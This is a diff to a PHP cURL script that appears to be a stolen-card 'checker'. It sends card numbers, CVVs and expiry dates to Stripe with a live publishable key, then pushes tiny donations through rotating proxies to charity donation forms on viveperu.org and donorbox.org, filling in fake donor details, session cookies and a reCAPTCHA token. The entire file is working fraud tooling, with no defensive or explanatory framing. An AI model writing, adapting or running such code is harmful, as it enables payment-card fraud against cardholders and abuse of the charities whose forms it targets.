@@ -256,10 +256,9 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8&sid=cacc4daa-7b5f-47ab-b61b-49c5ca32bec8e57eee&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=86555&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1031hI2bmikBJrxj');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=126875&key=pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT');
 
 $result1 = curl_exec($ch);
-$id = trim(strip_tags(getStr($result1,'"id": "','"pm_1KcutY2bmikBJrxjIwsCCg9S"')));
 //=======================[1 REQ-END]==============================//
 
 
@@ -267,7 +266,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"pm_1KcutY2bmikBJrxjIwsCCg9S"')
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://www.viveperu.org/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_URL, 'https://donorbox.org/donation');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -278,14 +277,14 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: www.viveperu.org',
+'authority: donorbox.org',
 'method: POST',
-'path: /wp-admin/admin-ajax.php',
+'path: /donation',
 'scheme: https',
-'accept: */*',
+'accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript',
 'accept-language: en-US,en;q=0.5',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: wp-give_session_5f36e31b0deaee977036bf5193ad2bed=e141e1703f04b9e16a6a250e79afae5e%7C%7C1647197454%7C%7C1647193854%7C%7C77eb84d1ff243a37f2492df27d788d95; wp-give_session_reset_nonce_5f36e31b0deaee977036bf5193ad2bed=1; __stripe_mid=bf4c1bc5-5665-4671-9c99-1284dfee1a38273ec8; __stripe_sid=cacc4daa-7b5f-47ab-b61b-49c5ca32bec8e57eee',
+'cookie: _donations_session=OJgP5aO9MPkT7vu0Hbqi%2BcG6O37Tk8bY0f08YUZHBT1XL0RrijHQArI9yh%2BYfLvHdNzAcMwin2L8FEHC8x6qVJqSQ6SfcSLDvzZFOmxZq%2FJIrujtSQKpQxcZRT2XQXiJWxTPatdHSYHxXfEBSbXSYkcOZ4zoT%2FwEGf0D2K9Q1MOOytJ2%2BZRH4seI5ioYXlMnpL6KiS5dZjgisGlYGtVwocZOgaA6Lo5%2F%2FjpAzDD8J%2FE4f8dJE%2FMemZKetXSC8jgtaKiVlfDqqA%3D%3D--K3rLk6JrPefUM8nB--NB1j7r1W3eDD9kt4Yszlvw%3D%3D; path=/; secure; HttpOnly',
 'origin: https://www.viveperu.org',
 'referer: https://www.viveperu.org/donate-now/?form-id=204834&level-id=custom&custom-amount=2.00&payment-mode=stripe',
 'sec-fetch-dest: empty',
@@ -297,7 +296,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'action=give_donation_form_reset_all_nonce&give_form_id=204834');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'utf8=%E2%9C%93&donation%5Bform_id%5D=88606&donation%5Bsms_message_id%5D=&currency=usd&slug=sociedad-donations-2&bf=9cca6db08a476fa8189c901ebedb08b9&sf=jh2aasdruzl88606&idempotency_key_index=&new_indian_regulation=false&s=MTY0NzE&t=5MjAwNQ&donation_type=stripe&donation%5Butm_params_attributes%5D%5Butm_source%5D=&donation%5Butm_params_attributes%5D%5Butm_medium%5D=&donation%5Butm_params_attributes%5D%5Butm_campaign%5D=&donation%5Butm_params_attributes%5D%5Butm_term%5D=&donation%5Butm_params_attributes%5D%5Butm_content%5D=&fee_amount=0&embedded_form=true&donation%5Bfmv_payment_attributes%5D%5Bamount%5D=0.00&donation%5Bfmv_payment_attributes%5D%5Bdescription%5D=&donation%5Bsuggested_text%5D=&donation%5Bcustom_amount%5D=1&donation%5Bcomment%5D=&donation%5Bfirst_name%5D=jhon&donation%5Blast_name%5D=ldke&donation%5Banonymous_donation%5D=off&donation%5Bemail%5D=info%40dfedsofrd.com&donation%5Bphone%5D=2024051548&donation%5Bcountry%5D=US&donation%5Baddress%5D=145+Nassau+Street&donation%5Bzip_code%5D=10038&donation%5Bcity%5D=New+York&donation%5Bstate%5D=NY&stripe_token=&stripe_pm_id=pm_0Kcv7MTiySUjG2VvwltspFgc&stripe_pi_id=&stripe_public_key=pk_live_1TiySUjG2VvU27ZhnX775lWtq4Gq45tuRo3f47l3fel2t9TuG0hHT2dc9IuyITSCdm8scWA6aQ50qIPoPZ8DZuMns009QRfWOPT&g-recaptcha-response-data%5Bdonation_create%5D=03AGdBq253PzhjhvIELgCW_QRcm3vug1VAZ9x3Y0XJv8vv8jQBrsAOsTpmmKnXaf22epNW9wfJAX9filb1CraYRVCcuW7ZJXm39KjHPMRWEHEi-fKQZUR98l7T-GUet3PhY7zFvQW4KT85-CF_bkeRRM5UcpqboAChVCX-dMYrk2biBDOXx0mA_pIatetesmpAUarnG504fCERaB3ebH2YcD-nRZhN3mTJq-kZrpn8EQFN21OGmMYWcd963x6ImWa-mH_fCvK0RQAoAGM_7NDSC1yZWXgwGQt5qbwlFKxLOkwne65GrSR1S0KVPdLoTpYIm3NNrR8D4E_g2MoUxcTXGWUZsEO75JAMhUjptCsJ3azTXs-myQZ6YEI1ZMy_xzLt2WwGUGeeZFfZcafEBv4Wtvs06pluByeT5Q4yPdA-AhZzgOOZR8g8u9bnsDUa61_fxKzrUAkcrfGdwVswilZxSjllx73cNi3pRg&g-recaptcha-response=');
 
 
 $result2 = curl_exec($ch);
